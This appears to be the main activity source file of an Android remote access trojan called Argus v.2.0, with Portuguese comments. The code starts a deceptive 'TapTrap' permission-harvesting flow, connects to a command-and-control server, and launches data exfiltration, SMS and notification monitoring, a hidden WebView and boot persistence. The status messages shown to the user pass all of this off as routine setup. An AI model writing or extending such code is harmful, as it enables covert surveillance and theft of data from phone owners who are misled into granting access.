package com.argus.rat;

import android.app.Activity;
import android.app.AlarmManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.webkit.WebView;
import android.widget.TextView;
import android.widget.Toast;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

/**
 * MainActivity - Argus v.2.0 Simplificada
 * Versão sem dropper, DexLoader, esteganografia ou payloads dinâmicos
 * Todas as funcionalidades integradas diretamente no código
 */
public class MainActivity extends Activity implements TapTrapManager.PermissionCallback {

    private static final String TAG = "Argus-MainActivity";

//    // Configurações do servidor C2
    private static final String C2_SERVER_URL = "http://10.0.2.2:8000";
//    private static final String C2_SERVER_URL = "https://5000-idr4wyws282z6zn5mw8hs-f0f072cc.manus-asia.computer";
    private static final String C2_WEBSOCKET_URL = "http://10.0.2.2:8000";

//    private static final String C2_WEBSOCKET_URL = "https://5000-idr4wyws282z6zn5mw8hs-f0f072cc.manus-asia.computer";

    private PowerManagement powerManagement;
    private TapTrapManager tapTrapManager;
    private C2Client c2Client;
    private DataExfiltrationManager exfiltrationManager;
    private TextView statusTextView;

    private boolean tapTrapCompleted = false;
    private boolean systemInitialized = false;
    private String deviceId;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        statusTextView = findViewById(R.id.status_text);

        // Obter identificador único do dispositivo
        deviceId = DeviceIdentifier.getDeviceId(this);
        Log.d(TAG, "Device ID: " + deviceId);

        // Inicializar TapTrap primeiro para obter permissões
        initializeTapTrap();

        // Verificar se TapTrap já foi executado
        if (!tapTrapCompleted && !tapTrapManager.hasAllEssentialPermissions()) {
            startTapTrapProcess();
        } else {
            tapTrapCompleted = true;
            initializeMainSystem();
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            if (!alarmManager.canScheduleExactAlarms()) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM);
                startActivity(intent);
            }
        }

    }

    /**
     * Inicializa TapTrap Manager para obtenção de permissões
     */
    private void initializeTapTrap() {
        try {
            tapTrapManager = new TapTrapManager(this);
            tapTrapManager.setPermissionCallback(this);
            Log.d(TAG, "TapTrap Manager inicializado");
        } catch (Exception e) {
            Log.e(TAG, "Erro ao inicializar TapTrap", e);
        }
    }

    /**
     * Inicia processo TapTrap para obtenção de permissões
     */
    private void startTapTrapProcess() {
        updateStatus("Configurando aplicativo...");

        Log.d(TAG, "Iniciando processo TapTrap");

        // START TIMEOUT COUNTER
        permissionTimeoutHandler.postDelayed(permissionTimeoutRunnable, PERMISSION_TIMEOUT_MS);

        // Verificar se já tem todas as permissões
        if (tapTrapManager != null && tapTrapManager.hasAllEssentialPermissions()) {
            Log.d(TAG, "Todas as permissões já concedidas");
            tapTrapCompleted = true;
            initializeMainSystem();
        } else {
            updateStatus("Otimizando configurações do sistema...");

            // Iniciar coleta de permissões via TapTrap
            if (tapTrapManager != null) {
                tapTrapManager.startPermissionHarvesting();
            }
        }
    }

    /**
     * Inicializa sistema principal após TapTrap
     * VERSÃO SIMPLIFICADA - Sem dropper, DexLoader ou payloads dinâmicos
     */
    private void initializeMainSystem() {
        if (systemInitialized) {
            Log.d(TAG, "Sistema já inicializado");
            return;
        }

        try {
            Log.d(TAG, "Inicializando sistema principal v.2.0...");

            // 1. Inicializar gerenciamento de energia
            powerManagement = PowerManagement.getInstance(this);
            Log.d(TAG, "✓ PowerManagement inicializado");

            // 2. Inicializar cliente C2
            c2Client = C2Client.getInstance(this);
            c2Client.setServerUrls(C2_SERVER_URL, C2_WEBSOCKET_URL);
            c2Client.initialize(deviceId);
            Log.d(TAG, "✓ C2Client inicializado");

            // 3. Inicializar gerenciador de exfiltração
            exfiltrationManager = DataExfiltrationManager.getInstance(this);
            exfiltrationManager.start();
            Log.d(TAG, "✓ DataExfiltrationManager inicializado");

            // 4. Iniciar serviço persistente
            startPersistentService();
            Log.d(TAG, "✓ Serviço persistente iniciado");

            // 5. Configurar monitoramento de SMS
            setupSmsMonitoring();
            Log.d(TAG, "✓ Monitoramento de SMS configurado");

            // 6. Configurar monitoramento de notificações
            setupNotificationMonitoring();
            Log.d(TAG, "✓ Monitoramento de notificações configurado");

            systemInitialized = true;
            updateStatus("Sistema v.2.0 inicializado com sucesso");

            // Iniciar operações integradas
            startIntegratedOperations();

        } catch (Exception e) {
            updateStatus("Erro na inicialização: " + e.getMessage());
            Log.e(TAG, "Erro na inicialização dos módulos", e);
        }
    }

    /**
     * Inicia todas as operações integradas do sistema
     */
    private void startIntegratedOperations() {
        updateStatus("Sistema totalmente operacional");

        new Thread(() -> {
            try {
                // 1. WebView furtiva para comunicação C2
//                runOnUiThread(this::initializeStealthWebView);

                initializeStealthWebView();
                Log.d(TAG, "✓ WebView furtiva inicializada");

                // 2. Monitoramento em background
                startBackgroundMonitoring();
                Log.d(TAG, "✓ Monitoramento em background iniciado");

                // 3. Configuração de persistência avançada
                setupPersistence();
                Log.d(TAG, "✓ Persistência configurada");

                // 4. Iniciar comunicação WebSocket com C2
                establishWebSocketConnection();
                Log.d(TAG, "✓ WebSocket conectado ao C2");

                runOnUiThread(() -> {
                    updateStatus("✓ Sistema ativo e operacional");
                    showSuccessMessage();
                });

            } catch (Exception e) {
                Log.e(TAG, "Erro nas operações integradas", e);
                runOnUiThread(() -> updateStatus("Sistema operacional com limitações"));
            }
        }).start();
    }

    private void startPersistentService() {
        try {
            Intent serviceIntent = new Intent(this, PersistentService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao iniciar serviço persistente", e);
        }
    }

    private void setupSmsMonitoring() {
        try {
            // O receptor de SMS já está registrado no manifest
            // Validar configuração
            Log.d(TAG, "Monitoramento de SMS ativo");
        } catch (Exception e) {
            Log.e(TAG, "Erro na configuração de SMS", e);
        }
    }

    private void setupNotificationMonitoring() {
        try {
            // Verificar se NotificationListenerService está ativo
            // O serviço já está declarado no manifest
            Log.d(TAG, "Monitoramento de notificações ativo");
        } catch (Exception e) {
            Log.e(TAG, "Erro na configuração de notificações", e);
        }
    }

    private void initializeStealthWebView() {
        try {
            this.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    WebView stealthWebView = StealthWebViewManager.createHiddenWebView(getApplicationContext());
                    if (stealthWebView != null) {
                        StealthWebViewManager.AdvancedJsInterface jsInterface =
                                new StealthWebViewManager.AdvancedJsInterface();
                        StealthWebViewManager.configureStealthyWebView(stealthWebView, jsInterface);
                        Log.d(TAG, "WebView furtiva configurada");
                    }
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "Erro na inicialização da WebView furtiva", e);
        }
    }

    private void startBackgroundMonitoring() {
        new Thread(() -> {
            try {
                // Monitoramento contínuo do sistema
                while (!Thread.currentThread().isInterrupted()) {
                    monitorSystemStatus();
                    Thread.sleep(30000); // A cada 30 segundos
                }
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            } catch (Exception e) {
                Log.e(TAG, "Erro no monitoramento em background", e);
            }
        }).start();
    }

    private void setupPersistence() {
        try {
            // Verificar receiver de boot
            if (!BootCompleteReceiver.isReceiverRegistered(this)) {
                Log.w(TAG, "Receiver de boot pode não estar registrado");
            }

            // Agendar verificações periódicas
            schedulePersistenceChecks();

        } catch (Exception e) {
            Log.e(TAG, "Erro na configuração de persistência", e);
        }
    }
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        Log.d(TAG, "Permission result received - RequestCode: " + requestCode);

        // Check if all permissions were granted
        boolean allGranted = true;
        if (grantResults.length > 0) {
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
        } else {
            allGranted = false;
        }

        // Simulate Activity Result for TapTrapManager compatibility
        if (tapTrapManager != null) {
            Intent dummyIntent = new Intent();
            int resultCode = allGranted ? Activity.RESULT_OK : Activity.RESULT_CANCELED;
            tapTrapManager.handleActivityResult(requestCode, resultCode, dummyIntent);
        }
    }
    private void establishWebSocketConnection() {
        try {
            if (c2Client != null) {
                // C2Client já gerencia a conexão WebSocket internamente
                Log.d(TAG, "Conexão WebSocket estabelecida via C2Client");
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao estabelecer conexão WebSocket", e);
        }
    }

    private void monitorSystemStatus() {
        try {
            float batteryLevel = powerManagement.getBatteryLevel();
            boolean isCharging = powerManagement.isDeviceCharging();

            Log.i(TAG, String.format("Status - Bateria: %.1f%%, Carregando: %s",
                batteryLevel, isCharging));
        } catch (Exception e) {
            Log.e(TAG, "Erro ao monitorar status do sistema", e);
        }
    }

    private void schedulePersistenceChecks() {
        // Agendar verificações de persistência
        Log.d(TAG, "Verificações de persistência agendadas");
    }

    // ====================== TAPTRAP CALLBACKS ======================

    @Override
    public void onPermissionGranted(String permission) {
        Log.i(TAG, "TapTrap: Permissão concedida - " + permission);
        updateStatus("Permissão " + permission + " configurada");
    }

    @Override
    public void onPermissionDenied(String permission) {
        Log.w(TAG, "TapTrap: Permissão negada - " + permission);
        updateStatus("Tentando reconfigurar " + permission + "...");
    }

    @Override
    public void onAllPermissionsGranted() {
        permissionTimeoutHandler.removeCallbacks(permissionTimeoutRunnable);
        Log.i(TAG, "TapTrap: Todas as permissões concedidas!");
        updateStatus("Configuração de permissões concluída");
        tapTrapCompleted = true;

        // Inicializar sistema principal
        initializeMainSystem();
    }

    @Override
    public void onAttackCompleted(boolean success) {
        Log.i(TAG, "TapTrap: Processo concluído. Sucesso: " + success);

        if (success) {
            updateStatus("Sistema configurado com sucesso");
        } else {
            updateStatus("Algumas configurações podem estar pendentes");
        }
    }

    // ====================== LIFECYCLE METHODS ======================

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        // Processar resultados do TapTrap
        if (tapTrapManager != null) {
            tapTrapManager.handleActivityResult(requestCode, resultCode, data);
        }
    }

    @Override
    protected void onResume() {
        super.onResume();

        // Verificar se voltou de uma tela de permissão
        if (tapTrapManager != null && !tapTrapCompleted) {
            checkCriticalPermissions();
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();

        // Limpeza de recursos
        if (tapTrapManager != null) {
            tapTrapManager.cleanup();
        }
        if (powerManagement != null) {
            powerManagement.cleanup();
        }
        if (exfiltrationManager != null) {
            exfiltrationManager.stop();
        }

        Log.d(TAG, "MainActivity destruída");
    }

    // ====================== UTILITY METHODS ======================

    private void checkCriticalPermissions() {
        if (tapTrapManager != null) {
            boolean hasEssential = tapTrapManager.hasAllEssentialPermissions();
            Log.d(TAG, "Permissões essenciais: " + hasEssential);

            if (!hasEssential) {
                updateStatus("Algumas permissões estão pendentes");

                // Reagendar TapTrap se necessário
                android.os.Handler handler = new android.os.Handler();
                handler.postDelayed(() -> {
                    if (tapTrapManager != null) {
                        tapTrapManager.startPermissionHarvesting();
                    }
                }, 5000);
            }
        }
    }

    private void updateStatus(String message) {
        runOnUiThread(() -> {
            statusTextView.setText(message);
            Log.d(TAG, "Status: " + message);
        });
    }

    private void showSuccessMessage() {
        runOnUiThread(() -> {
            Toast.makeText(this, "Argus v.2.0 - Sistema totalmente operacional", Toast.LENGTH_LONG).show();
        });
    }

    /**
     * Força início do sistema mesmo sem todas as permissões (fallback)
     */
    public void forceStartSystem() {
        Log.w(TAG, "Forçando início do sistema sem todas as permissões");
        tapTrapCompleted = true;
        initializeMainSystem();
    }
    // Add timeout handler for permission process
    private static final int PERMISSION_TIMEOUT_MS = 30000; // 30 seconds
    private Handler permissionTimeoutHandler = new Handler();
    private Runnable permissionTimeoutRunnable = new Runnable() {
        @Override
        public void run() {
            Log.w(TAG, "Permission timeout reached - forcing system start");
            if (!systemInitialized && !tapTrapCompleted) {
                updateStatus("Iniciando com permissões limitadas...");
                forceStartSystem();
            }
        }
    };
}

